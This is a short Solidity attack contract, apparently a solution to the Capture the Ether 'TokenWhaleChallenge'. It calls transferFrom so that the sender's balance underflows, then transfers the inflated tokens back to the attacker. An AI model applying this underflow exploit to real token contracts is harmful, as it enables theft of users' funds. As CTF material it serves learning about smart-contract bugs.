pragma solidity ^0.4.21;

import "./TokenWhaleChallenge.sol";

contract AttackTokenWhaleChallenge{
    TokenWhaleChallenge tokenWhaleChallenge;

    function AttackTokenWhaleChallenge(address contractAddress) public{
        tokenWhaleChallenge = TokenWhaleChallenge(contractAddress);
    }

    /**
        Since the attackContract calls transferFrom, which then calls
        _transfer after all the require statements, msg.sender will be
        the attackContract. balanceOf[msg.sender]-=value will result
        in underflow.
     */
    function attack(address from, address to, uint256 value) public{
        tokenWhaleChallenge.transferFrom(from, to, value);
    }

    //Transfer tokens back to the attacker after attacking TokenWhaleChallenge
    function transfer(address to, uint256 value) public{
        tokenWhaleChallenge.transfer(to, value);
    }
}